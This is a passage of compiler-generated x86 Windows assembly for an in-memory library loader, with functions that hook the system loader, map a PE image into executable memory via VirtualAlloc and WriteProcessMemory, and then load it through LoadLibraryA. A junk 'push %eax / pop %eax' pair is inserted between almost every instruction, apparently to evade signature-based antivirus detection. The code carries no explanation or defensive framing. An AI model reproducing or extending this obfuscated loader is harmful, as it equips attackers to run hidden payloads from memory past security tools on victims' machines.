push %eax
pop %eax
	movl	__imp__GetProcAddress@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	movl	%eax, -32(%ebp)
push %eax
pop %eax
	movl	$LC6, 4(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__GetProcAddress@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	movl	%eax, -36(%ebp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	leal	316(%eax), %edx
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_restore_function
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	leal	286(%eax), %edx
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_restore_function
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	leal	296(%eax), %edx
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_restore_function
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	leal	306(%eax), %edx
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_restore_function
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	leal	276(%eax), %edx
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_restore_function
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	leal	326(%eax), %edx
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_restore_function
push %eax
pop %eax
	jmp	L35
push %eax
pop %eax
L38:
	nop
push %eax
pop %eax
L35:
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
LC7:
	.ascii "NtLockVirtualMemory\0"
	.text
	.globl	_map_file
	.def	_map_file;	.scl	2;	.type	32;	.endef
_map_file:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	pushl	%ebx
push %eax
pop %eax
	subl	$68, %esp
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	264(%eax), %eax
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	264(%eax), %edx
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	60(%eax), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	80(%eax), %eax
push %eax
pop %eax
	movl	-20(%ebp), %edx
push %eax
pop %eax
	movl	52(%edx), %edx
push %eax
pop %eax
	movl	$64, 12(%esp)
push %eax
pop %eax
	movl	$12288, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	movl	__imp__VirtualAlloc@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 268(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	268(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L40
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	80(%eax), %eax
push %eax
pop %eax
	movl	$64, 12(%esp)
push %eax
pop %eax
	movl	$12288, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$0, (%esp)
push %eax
pop %eax
	movl	__imp__VirtualAlloc@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 268(%eax)
push %eax
pop %eax
L40:
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	80(%eax), %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 272(%eax)
push %eax
pop %eax
	movl	$LC0, (%esp)
push %eax
pop %eax
	movl	__imp__GetModuleHandleA@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	$LC7, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__GetProcAddress@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	movl	%eax, -24(%ebp)
push %eax
pop %eax
	cmpl	$0, -24(%ebp)
push %eax
pop %eax
	je	L41
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	268(%eax), %eax
push %eax
pop %eax
	movl	%eax, -32(%ebp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	80(%eax), %eax
push %eax
pop %eax
	movl	%eax, -36(%ebp)
push %eax
pop %eax
	movl	$1, 12(%esp)
push %eax
pop %eax
	leal	-36(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	leal	-32(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$-1, (%esp)
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
L41:
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	84(%eax), %eax
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	264(%edx), %edx
push %eax
pop %eax
	movl	%edx, %ecx
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	268(%edx), %edx
push %eax
pop %eax
	movl	$0, 16(%esp)
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	%ecx, 8(%esp)
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	$-1, (%esp)
push %eax
pop %eax
	movl	__imp__WriteProcessMemory@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movzwl	20(%eax), %eax
push %eax
pop %eax
	movzwl	%ax, %edx
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	addl	$24, %eax
push %eax
pop %eax
	movl	%eax, -28(%ebp)
push %eax
pop %eax
	movl	$0, -12(%ebp)
push %eax
pop %eax
	jmp	L42
push %eax
pop %eax
L43:
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	sall	$2, %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	sall	$3, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	16(%eax), %ecx
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	sall	$2, %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	sall	$3, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	20(%eax), %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	264(%eax), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, %ebx
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	sall	$2, %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	sall	$3, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	12(%eax), %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	268(%eax), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	$0, 16(%esp)
push %eax
pop %eax
	movl	%ecx, 12(%esp)
push %eax
pop %eax
	movl	%ebx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$-1, (%esp)
push %eax
pop %eax
	movl	__imp__WriteProcessMemory@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	addl	$1, -12(%ebp)
push %eax
pop %eax
L42:
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movzwl	6(%eax), %eax
push %eax
pop %eax
	movzwl	%ax, %eax
push %eax
pop %eax
	cmpl	%eax, -12(%ebp)
push %eax
pop %eax
	jl	L43
push %eax
pop %eax
	nop
push %eax
pop %eax
	nop
push %eax
pop %eax
	movl	-4(%ebp), %ebx
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.globl	_libloader_load_library
	.def	_libloader_load_library;	.scl	2;	.type	32;	.endef
_libloader_load_library:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$40, %esp
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	$0, -16(%ebp)
push %eax
pop %eax
	movl	$0, -20(%ebp)
push %eax
pop %eax
	movl	$92, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_strrchr
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	cmpl	$0, -16(%ebp)
push %eax
pop %eax
	je	L45
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	addl	$1, %eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
L45:
	movl	$64, 12(%esp)
push %eax
pop %eax
	movl	$4096, 8(%esp)
push %eax
pop %eax
	movl	$384, 4(%esp)
push %eax
pop %eax
	movl	$0, (%esp)
push %eax
pop %eax
	movl	__imp__VirtualAlloc@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movl	%eax, _ctx
push %eax
pop %eax
	movl	_ctx, %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L46
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
	jmp	L47
push %eax
pop %eax
L46:
	movl	_ctx, %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_install_hooks
push %eax
pop %eax
	movl	_ctx, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	$255, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$256, 4(%esp)
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	movl	__imp__strncpy_s, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	_ctx, %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_strlen
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	_ctx, %eax
push %eax
pop %eax
	addl	$1, %edx
push %eax
pop %eax
	movl	%edx, 256(%eax)
push %eax
pop %eax
	movl	_ctx, %eax
push %eax
pop %eax
	movl	12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 264(%eax)
push %eax
pop %eax
	movl	_ctx, %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_map_file
push %eax
pop %eax
	movl	_ctx, %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__LoadLibraryA@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	cmpl	$0, -20(%ebp)
push %eax
pop %eax
	movl	_ctx, %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_remove_hooks
push %eax
pop %eax
	movl	_ctx, %eax
push %eax
pop %eax
	movl	$32768, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__VirtualFree@12, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
L47:
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.ident	"GCC: (GNU) 9.3-win32 20200320"
	.def	_strrchr;	.scl	2;	.type	32;	.endef
	.def	_strlen;	.scl	2;	.type	32;	.endef
